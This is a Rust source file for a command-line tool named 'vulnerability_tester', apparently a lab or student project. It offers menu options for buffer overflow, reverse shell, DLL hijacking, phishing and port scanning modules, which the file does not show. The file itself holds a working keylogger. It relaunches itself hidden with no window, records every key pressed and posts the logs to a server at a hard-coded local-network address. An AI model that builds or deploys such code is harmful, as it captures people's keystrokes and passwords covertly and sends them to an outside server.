use clap::{Parser, Subcommand};
use std::io::{self, Write};
use std::process::{Command, Stdio};
use std::os::windows::process::CommandExt;
use std::time::Duration;
use device_query::{DeviceQuery, DeviceState, Keycode};
use ureq;

mod overflow;
mod reverse_shell;
mod dll_hijacking_c;
mod phishing;
mod decrypt;
mod port_scanner;

#[derive(Parser)]
#[command(name = "vulnerability_tester")]
#[command(author = "Diogo Andrade & Tiago Pereira")]
#[command(version = "1.0")]
#[command(about = "A CLI tool to test various vulnerabilities", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,

    /// Internal flag to run the keylogger in background mode
    #[arg(long)]
    background_keylogger: bool,
}

#[derive(Subcommand)]
enum Commands {
    /// Test for buffer overflow vulnerability
    BufferOverflow {},

    /// Simulate a reverse shell attack
    ReverseShell {},

    /// Generate a malicious DLL
    DllHijacking {},

    /// Decrypt the Documents folder
    DecryptDocuments {},

    /// Deploy and execute a keylogger
    Keylogger {},
}

fn main() {
    let cli = Cli::parse();

    // Check if background mode is requested
    if cli.background_keylogger {
        handle_background_keylogger();
        return;
    }

    if cli.command.is_none() {
        loop {
            clear_terminal();
            println!(" ____                    _              _ ");
            println!("| __ )    __ _   _ __   | | __   __ _  (_) ");
            println!("|  _ \\   / _` | | '_ \\  | |/ /  / _` | | | ");
            println!("| |_) | | (_| | | | | | |   <  | (_| | | | ");
            println!("|____/   \\__,_| |_| |_| |_\\_\\  \\__,_ | |_| ");
            println!();

            // Print the options
            println!("1. Buffer Overflow        2. Reverse Shell");
            println!("3. Port Scanner           4. Keylogger");
            println!("5. Generate DLL           6. Phishing");
            println!("7. Decrypt                9. Exit");
            println!();

            print!("Enter the number of your choice: ");
            io::stdout().flush().unwrap();

            let mut choice = String::new();
            io::stdin().read_line(&mut choice).unwrap();

            match choice.trim() {
                "1" => test_buffer_overflow(),
                "2" => reverse_shell::simulate_reverse_shell(),
                "3" => port_scanner::port_scanner(),
                "4" => deploy_keylogger_detached(),
                "5" => match dll_hijacking_c::compile_c_to_dll() {
                    Ok(_) => println!("DLL compiled successfully."),
                    Err(e) => eprintln!("Compilation error: {}", e),
                },
                "6" => phishing::generate_email(),
                "7" => decrypt::decrypt_documents_cli(),
                "9" => {
                    println!("Exiting...");
                    break;
                }
                _ => println!("Invalid choice. Please try again."),
            }
        }
    } else {
        match cli.command.unwrap() {
            Commands::BufferOverflow {} => test_buffer_overflow(),
            Commands::ReverseShell {} => reverse_shell::simulate_reverse_shell(),
            Commands::Keylogger {} => deploy_keylogger_detached(),
            Commands::DllHijacking {} => {
                if let Err(e) = dll_hijacking_c::compile_c_to_dll() {
                    eprintln!("Compilation error: {}", e);
                }
            }
            Commands::DecryptDocuments {} => decrypt::decrypt_documents_cli(),
        }
    }
}

fn deploy_keylogger_detached() {
    println!("Deploying keylogger...");

    let exe_path = std::env::current_exe().expect("Failed to get current executable path");

    let child = Command::new(exe_path)
        .arg("--background-keylogger")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .creation_flags(0x08000000) // CREATE_NO_WINDOW
        .spawn();

    match child {
        Ok(_) => println!("Keylogger is running in the background."),
        Err(e) => eprintln!("Failed to start keylogger: {}", e),
    }
}

fn handle_background_keylogger() {
    let device_state = DeviceState::new();
    let mut last_keys = vec![];

    println!("Keylogger is active. Logs will be sent directly to the server.");

    loop {
        let keys = device_state.get_keys();

        // Check if Alt+S is pressed to stop
        if keys.contains(&Keycode::LAlt) || keys.contains(&Keycode::RAlt) {
            if keys.contains(&Keycode::S) {
                println!("Keylogger stopped by Alt+S.");
                return; // Exit the keylogger loop
            }
        }

        let mut key_log = String::new();

        // Detect new keys pressed
        for key in keys.iter() {
            if !last_keys.contains(key) {
                let key_string = match key {
                    Keycode::Enter => "\n".to_string(),
                    Keycode::Space => " ".to_string(),
                    Keycode::Tab => "[Tab]".to_string(),
                    Keycode::LShift | Keycode::RShift => "[Shift]".to_string(),
                    Keycode::Backspace => "[Backspace]".to_string(),
                    Keycode::Escape => "[ESC]".to_string(),
                    _ => format!("{:?}", key),
                };

                key_log.push_str(&key_string);

                // Debugging: Print each key detected
                println!("Key Detected: {}", key_string);
            }
        }

        // Send detected keys to the server
        if !key_log.is_empty() {
            if let Err(e) = send_logs_to_server(&key_log) {
                eprintln!("Failed to send logs to server: {}", e);
            } else {
                println!("Keys sent to server: {}", key_log); // Debugging
            }
        }

        // Update the last keys state
        last_keys = keys;

        // Reduce sleep time for more frequent polling
        std::thread::sleep(Duration::from_millis(50)); // Sleep for 50 milliseconds
    }
}

fn send_logs_to_server(key_log: &str) -> Result<(), Box<dyn std::error::Error>> {
    let response = ureq::post("http://192.168.153.129:5000/upload") // Update with your server's URL
        .send_string(key_log);

    match response {
        Ok(res) => {
            println!("Logs sent successfully. Server response: {}", res.status_text());
        }
        Err(ureq::Error::Status(code, res)) => {
            eprintln!("Failed to send logs. HTTP {}: {}", code, res.status_text());
        }
        Err(e) => {
            eprintln!("Failed to send logs: {}", e);
        }
    }

    Ok(())
}


fn test_buffer_overflow() {
    println!("Testing buffer overflow vulnerability...");
    overflow::overflow_server();
}

fn clear_terminal() {
    #[cfg(target_os = "windows")]
    Command::new("cmd")
        .args(&["/C", "cls"])
        .output()
        .expect("Failed to clear terminal");

    #[cfg(target_os = "linux")]
    Command::new("clear")
        .output()
        .expect("Failed to clear terminal");
}
